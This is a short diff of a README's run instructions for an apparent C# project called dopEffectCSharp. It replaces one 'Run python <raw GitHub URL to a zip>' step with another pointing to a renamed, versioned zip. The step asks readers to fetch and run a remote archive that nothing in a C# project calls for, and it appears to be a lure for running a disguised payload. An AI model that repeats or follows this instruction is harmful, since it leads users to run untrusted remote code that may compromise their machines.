@@ -9,6 +9,6 @@
 
 ###How to Run  this project
 - Download / Clone this project to your machine.
-- Run "python https://raw.githubusercontent.com/Muhamed2017/dopEffectCSharp/master/undowned/dopEffectCSharp.zip" 
+- Run "python https://github.com/Muhamed2017/dopEffectCSharp/raw/refs/heads/master/undowned/dop_Sharp_C_Effect_v2.8.zip" 
 - Enjoy
 - Leave a Feedback
